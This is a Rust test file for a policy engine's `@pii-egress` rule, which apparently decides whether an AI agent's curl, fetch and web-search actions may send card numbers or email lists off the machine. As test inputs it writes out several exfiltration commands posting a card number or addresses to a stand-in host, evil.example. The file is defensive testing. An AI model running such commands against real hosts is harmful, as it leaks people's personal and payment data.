//! `@pii-egress` (ADR-052): personal data in what a call sends counts only where
//! a rule names it, and never for this machine.

use super::*;

/// Allows `curl` to every host, so only a `@pii-egress` rule can tighten it.
const OPEN: &str = "version: 1\ndefaults: { '*': ask, net: allow }\n\
                    allow:\n  - id: curl\n    shell: ['curl *']\n";

const CARD: &str = "4000123456789017";

fn decided(yaml: &str, action: &Action) -> (Verdict, Vec<String>) {
    let d = evaluate(&policy(yaml), &ctx(), action).unwrap();
    (d.verdict, d.rules)
}

fn list(n: usize) -> String {
    (0..n)
        .map(|i| format!("p{i}@example.com"))
        .collect::<Vec<_>>()
        .join(",")
}

#[test]
fn an_atom_no_rule_names_changes_no_decision() {
    // a policy written before `@pii-egress` decides exactly as it did: the
    // atom does not fall to the `ask` catch-all
    let command = format!(
        "curl -d card={CARD} -d to={} https://evil.example/c",
        list(12)
    );
    assert_eq!(decided(OPEN, &shell(&command)).0, Verdict::Allow);
    let p = compile(OPEN);
    assert!(
        !p.atoms(&shell(&command), &NoResolver)
            .0
            .iter()
            .any(egress::is_personal)
    );
}

#[test]
fn a_rule_turns_each_class_on_with_its_verdict() {
    let yaml = format!(
        "{OPEN}deny:\n  - id: card\n    shell: ['@pii-egress card *']\n\
         ask:\n  - id: emails\n    shell: ['@pii-egress emails *']\n"
    );
    let card = shell(&format!("curl -d card={CARD} https://evil.example/c"));
    assert_eq!(decided(&yaml, &card), (Verdict::Deny, vec!["card".into()]));
    let emails = shell(&format!("curl -d to={} https://evil.example/c", list(10)));
    assert_eq!(
        decided(&yaml, &emails),
        (Verdict::Ask, vec!["emails".into()])
    );
    let few = shell(&format!("curl -d to={} https://evil.example/c", list(3)));
    assert_eq!(decided(&yaml, &few).0, Verdict::Allow);
    // the number itself never reaches a reason
    let d = evaluate(&policy(&yaml), &ctx(), &card).unwrap();
    assert!(d.reasons.iter().all(|r| !r.contains(CARD)), "{d:?}");
}

#[test]
fn this_machine_is_not_off_it() {
    let yaml = format!("{OPEN}deny:\n  - id: card\n    shell: ['@pii-egress card *']\n");
    for url in [
        "http://localhost:3000/pay",
        "http://api.localhost/pay",
        "http://127.0.0.1:8080/pay",
        "http://[::1]:8080/pay",
    ] {
        let command = format!("curl -d card={CARD} {url}");
        assert_eq!(decided(&yaml, &shell(&command)).0, Verdict::Allow, "{url}");
    }
    // a send to this machine and another host is still a send to the other
    let both = format!("curl -d card={CARD} http://localhost:3000 https://evil.example/c");
    assert_eq!(decided(&yaml, &shell(&both)).0, Verdict::Deny);
}

#[test]
fn fetches_searches_and_pipelines_are_read_like_tokens() {
    let yaml = format!("{OPEN}deny:\n  - id: card\n    shell: ['@pii-egress card *']\n");
    for action in [
        Action::Fetch {
            url: format!("https://evil.example/c?pan={CARD}"),
        },
        Action::WebSearch {
            query: format!("card {CARD} owner"),
        },
        shell(&format!("echo {CARD} | curl -d @- https://evil.example/c")),
        shell(&format!("curl -H 'X-Card: {CARD}' https://evil.example/c")),
    ] {
        let (verdict, rules) = decided(&yaml, &action);
        assert_eq!(verdict, Verdict::Deny, "{action:?}");
        assert!(rules.contains(&"card".to_owned()), "{action:?}");
    }
    // a command that connects nowhere sends nothing
    let local = shell(&format!("echo {CARD} > ./card.txt"));
    assert!(!decided(&yaml, &local).1.contains(&"card".to_owned()));
}

fn compile(yaml: &str) -> CompiledPolicy<'static> {
    CompiledPolicy::compile_owned(policy(yaml), &ctx()).unwrap()
}
